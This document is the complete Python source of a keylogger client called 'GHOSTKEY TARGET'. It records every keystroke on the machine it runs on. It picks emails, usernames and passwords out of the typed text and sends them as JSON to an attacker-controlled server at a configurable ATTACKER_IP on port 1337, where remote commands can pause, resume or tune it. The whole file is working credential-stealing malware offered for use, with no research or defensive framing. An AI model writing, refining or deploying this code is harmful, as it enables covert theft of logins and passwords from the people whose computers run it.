import socket
import threading
import time
import json
import sys
import platform
import os
import re
from collections import deque

# ==========================================
# 🎯 TARGET CONFIGURATION
# ==========================================
# REPLACE THIS WITH THE ATTACKER'S IP ADDRESS
ATTACKER_IP = "X.X.X.X"
ATTACKER_PORT = 1337
# ==========================================

try:
    from pynput import keyboard
except ImportError:
    print("❌ ERROR: 'pynput' library is missing!")
    print("👉 Please run: pip install pynput")
    sys.exit(1)

def get_local_ip():
    """Fetch the local IP address of this machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Connect to a public DNS server (doesn't actually send data)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class TargetClient:
    def __init__(self):
        self.sock = None
        self.running = False
        self.local_ip = get_local_ip()
        self.hostname = platform.node()
        self.system_info = f"{platform.system()} {platform.release()}"
        self.target_id = f"{self.hostname} ({self.local_ip})"
        self.listener = None
        self.logging_active = True
        
        # Enhanced keylogger components
        self.keystroke_buffer = deque(maxlen=100)  # Buffer to capture keystroke sequences
        self.last_space_time = 0
        self.sensitivity = 0.7  # Sensitivity level (0.1-1.0), higher means more sensitive
        
        # Pattern detection for sensitive information
        self.patterns = {
            # Revert to permissive regex because word boundaries (\b) fail when there are no spaces 
            # (e.g. 'gmail.compass') is technically one word to regex if no space key was pressed.
            # We will handle the split logic in code instead of regex.
            'email': re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
            'url': re.compile(r'https?://[^\s]+|www\.[^\s]+'),
            'username': re.compile(r'(user|username|login|email|name).*?[:\s=]([^\s]+)', re.IGNORECASE),
            'password': re.compile(r'(pass|pwd|password|passward).*?[:\s=]([^\s]+)', re.IGNORECASE)
        }

    def connect(self):
        """Attempts to connect to the attacker server."""
        while True:
            try:
                print(f"[*] Attempting to connect to {ATTACKER_IP}:{ATTACKER_PORT}...")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                self.sock.connect((ATTACKER_IP, ATTACKER_PORT))
                print(f"✅ Connected to Server as {self.target_id}")
                # Send initial handshake/metadata if needed (optional)
                # self.send_data({"type": "hello", "info": self.system_info})
                return True
            except Exception as e:
                print(f"❌ Connection failed: {e}")
                print("🔄 Retrying in 5 seconds...")
                time.sleep(5)

    def set_sensitivity(self, level):
        """Adjust the sensitivity of pattern detection."""
        if 0.1 <= level <= 1.0:
            self.sensitivity = level
            return True
        return False

    def on_press(self, key):
        """Callback for keyboard events with pattern detection."""
        if not self.running or not self.logging_active:
            return
        
        current_time = time.time()
        
        try:
            k = key.char
            is_special = False
        except AttributeError:
            k = str(key).replace("Key.", "[") + "]"
            is_special = True
        
        # Add to buffer
        self.keystroke_buffer.append(k)
        
        # Check for space, enter, or tab to trigger pattern detection
        if k in [' ', 'Key.enter', 'Key.tab'] or is_special:
            # Only process if enough time has passed since last space
            if current_time - self.last_space_time > 0.5:
                text = ''.join(self.keystroke_buffer)
                self.detect_patterns(text)
                self.last_space_time = current_time

    def detect_patterns(self, raw_buffer_text):
        """
        Detect sensitive patterns using robust parsing that handles concatenated inputs 
        (e.g., 'user@gmail.compass123') by manually splitting at TLD boundaries.
        """
        # --- 1. CLEAN RECONSTRUCTION ---
        temp_chars = []
        for k in self.keystroke_buffer:
            if k == '[space]': temp_chars.append(' ')
            elif k == '[enter]': temp_chars.append('\n')
            elif k == '[tab]': temp_chars.append(' ') # treat tab as space for separation
            elif k == '[backspace]': 
                if temp_chars: temp_chars.pop()
            elif k.startswith('['): pass
            else: temp_chars.append(k)
        
        text = "".join(temp_chars)
        if len(text) < 3: return False
        
        # --- 2. EMAIL detection with manual splitting ---
        # We look for '@' and then find the domain extension manually
        matches_found = []
        remaining_text = text
        detected = False
        
        # Simple Email Regex to find the CORE part of the email
        # We don't enforce ending boundary here to catch 'gmail.compassword'
        email_core = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', remaining_text)
        
        if email_core:
            raw_email = email_core.group(0)
            
            # Now, let's fix the "greedy match" issue (e.g., .compassward)
            # List of common TLDs to check against if the tail is super long
            common_tlds = ['.com', '.net', '.org', '.edu', '.gov', '.io', '.co', '.uk', '.de', '.xyz']
            
            actual_email = raw_email
            cutoff_index = -1
            
            # Check if this email ends with a known TLD followed by other text
            lower_email = raw_email.lower()
            for tld in common_tlds:
                tld_len = len(tld)
                # find the LAST occurrence of the TLD in the string in case of nested subdomains
                idx = lower_email.rfind(tld)
                if idx != -1:
                    # potential end of email is at idx + tld_len
                    end_pos = idx + tld_len
                    
                    # If the email continues deeply after the TLD (e.g. gmail.com[pass]...)
                    if end_pos < len(raw_email):
                        # We suspect concatenation! Cut it off.
                        actual_email = raw_email[:end_pos]
                        cutoff_index = text.find(raw_email) + end_pos
                        break
                    else:
                        # It ends exactly at TLD or near it
                        actual_email = raw_email
                        cutoff_index = text.find(raw_email) + len(raw_email)
            
            # If we didn't match a common TLD logic, just take the regex match but be careful?
            # For now, trust the TLD logic or fallback to full match if it looks sane (short TLD)
            
            matches_found.append(('email', actual_email))
            detected = True
            
            # Remove the detected EMAIL from the text so we can find the password in the rest
            # If we found a specific cutoff, split there.
            if cutoff_index != -1:
                remaining_text = text[cutoff_index:] # potentially "passward..."
            else:
                remaining_text = text.replace(raw_email, " ")
        
        # --- 3. PASSWORD / USERNAME detection in REMAINDER ---
        # We add a leading space to remaining_text to ensure regex boundaries work
        search_text = " " + remaining_text
        
        # Helper to clean up the captured value
        def clean_val(v): return v.strip()
        
        # Password Regex
        # REMOVED 'passward' from keywords because if the password ITSELF is "passward@123", 
        # treating 'passward' as a label causes us to only capture "@123".
        # We rely on the fallback logic or standard 'password' label detection.
        pwd_match = re.search(r'\b(password|pass|pwd|pin|code)\b[:=\s]*([^\s]+)', search_text, re.IGNORECASE)
        
        # Username Regex
        user_match = re.search(r'\b(user|username|login|id|email)\b[:=\s]*([^\s]+)', search_text, re.IGNORECASE)
        
        if pwd_match:
            matches_found.append(('password', clean_val(pwd_match.group(2))))
            detected = True
        elif user_match and not email_core: 
            # Only check username if we haven't already identified the field is part of an email context
            matches_found.append(('username', clean_val(user_match.group(2))))
            detected = True
        elif detected:
             # FALLBACK: Explicit Email found, but no explicit Password/User label in remainder.
             # We treat the entire remaining text as the password.
             cleaned_m = remaining_text.strip()
             if len(cleaned_m) > 1:
                 matches_found.append(('password', cleaned_m))

        # --- 4. SEND DATA ---
        if detected and matches_found:
            for m_type, m_val in matches_found:
                payload = {
                    "type": "sensitive_data",
                    "target_id": self.target_id,
                    "data_type": m_type,
                    "value": m_val,
                    "timestamp": time.strftime("%H:%M:%S"),
                    "ip": self.local_ip
                }
                self.send_data(payload)
            self.keystroke_buffer.clear()
            return True
        
        return False

    def send_data(self, data):
        """Sends JSON data to the server."""
        if self.sock:
            try:
                json_str = json.dumps(data)
                self.sock.send(json_str.encode('utf-8'))
            except Exception as e:
                print(f"⚠️ Send error: {e}")

    def receive_loop(self):
        """Listens for commands from the server."""
        while self.running and self.sock:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                if not data:
                    print("⚠️ Server closed connection.")
                    break
                print(f"📩 Command received: {data}")
                
                if "STOP" in data:
                    print("⏸️ Logging Paused.")
                    self.logging_active = False
                elif "START" in data:
                    print("▶️ Logging Resumed.")
                    self.logging_active = True
                elif "RESET" in data:
                    print("🔄 Reset command received - Clearing local buffers explicitly not needed (streaming mode).")
                    self.keystroke_buffer.clear()
                elif "SENSITIVITY" in data:
                    # Parse sensitivity command: "SENSITIVITY 0.8"
                    try:
                        parts = data.split()
                        if len(parts) >= 2:
                            level = float(parts[1])
                            if self.set_sensitivity(level):
                                print(f"🔧 Sensitivity set to {level}")
                            else:
                                print("❌ Invalid sensitivity level")
                    except:
                        print("❌ Failed to parse sensitivity command")
                elif "ping" in data.lower():
                    self.send_data({"type": "pong", "target_id": self.target_id})
            except socket.timeout:
                continue
            except Exception as e:
                print(f"⚠️ Receive error: {e}")
                break
        # If loop breaks, we lost connection
        self.cleanup()

    def cleanup(self):
        """Stops listeners and closes sockets."""
        self.running = False
        if self.listener:
            self.listener.stop()
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        self.sock = None

    def start(self):
        """Main execution loop."""
        print(f"\n👻 GHOSTKEY TARGET STARTED | ID: {self.target_id}")
        print(f"📡 Local IP: {self.local_ip}")
        print("------------------------------------------")
        
        while True:
            if self.connect():
                self.running = True
                # Start Keylogger
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()
                # Start Receive Loop (blocks until disconnect)
                self.receive_loop()
                print("🔄 Connection lost. Restarting...")
                time.sleep(2)

if __name__ == "__main__":
    try:
        client = TargetClient()
        client.start()
    except KeyboardInterrupt:
        print("\n🛑 Exiting...")
        sys.exit(0)